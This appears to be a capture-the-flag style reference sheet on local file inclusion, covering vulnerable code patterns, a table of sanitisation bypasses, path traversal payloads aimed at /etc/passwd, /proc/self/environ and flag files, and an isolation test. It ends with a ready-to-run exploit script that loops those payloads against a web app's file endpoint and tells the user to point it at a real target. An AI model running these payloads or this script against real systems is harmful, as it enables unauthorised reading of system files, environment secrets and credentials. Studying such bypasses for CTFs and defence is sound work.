# LFI Bypass Patterns Reference

## Weakness Categories

### 1. Direct Path Concatenation
```python
# Source: open(BASE_DIR + user_input)
# or:     open(f"/var/www/files/{filename}")
```
Target: `../../../../etc/passwd` or flag file directly.

### 2. PHP include/require
```php
// Source: include($_GET['page'] . '.php')
```
Target: `../../../../etc/passwd%00` (null byte, PHP<5.5) or PHP filter wrapper:
`php://filter/convert.base64-encode/resource=../../../../flag`

### 3. os.path.join Bypass
```python
# os.path.join("/var/www/", "/etc/passwd") → "/etc/passwd"
# Absolute path in user input bypasses join prefix
```
Target: `/proc/self/environ`, `/etc/flag`, `/flag`.

### 4. Zip / Archive Traversal
```python
# ZipFile.extractall(upload_dir) without path sanitization
# → ../../../flag in zip entry name
```

---

## Sanitization Bypass Table

| Sanitization | Bypass |
|-------------|--------|
| `basename()` / `os.path.basename()` | No bypass — filename only kept. **NOT exploitable via traversal.** |
| `startswith("/safe/")` | Absolute path bypass: `/safe/../../flag` |
| `realpath()` + `startswith()` | Hard — need symlink or check if validation is before/after read |
| Extension append `.php` | Null byte `%00` (PHP<5.5), PHP filter `php://filter` |
| None | Direct traversal |

---

## Isolation Test

```python
# /tmp/aurelinth/test_lfi_isolation.py
import os

BASE = "/var/www/uploads/"

def read_file(filename):
    path = BASE + filename          # pattern 1: concatenation
    # path = os.path.join(BASE, filename)  # pattern 2: join
    return path

payloads = [
    "../../../../etc/passwd",
    "....//....//....//etc/passwd",
    "/etc/passwd",                   # absolute — works with os.path.join
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
]
for p in payloads:
    resolved = read_file(p)
    exists = os.path.exists(resolved)
    print(f"Payload: {p!r} → {resolved} (exists: {exists})")
```

---

## Exploit Script

```python
# /tmp/aurelinth/exploit_lfi.py
import requests

BASE = "http://LOCAL_TARGET"
s = requests.Session()
s.post(f"{BASE}/login", data={"username":"pwn","password":"pwn"})

# Adjust depth based on app working directory from docker-compose
payloads = [
    "../../../../flag",
    "../../../../flag.txt",
    "../../../../proc/self/environ",
    "/flag",  # absolute — works if os.path.join used
]

for payload in payloads:
    r = s.get(f"{BASE}/file", params={"name": payload})
    if r.status_code == 200 and len(r.text) > 0:
        print(f"[HIT] {payload}")
        print(r.text[:300])
        break
```

Change `BASE` to real target URL for final attack.
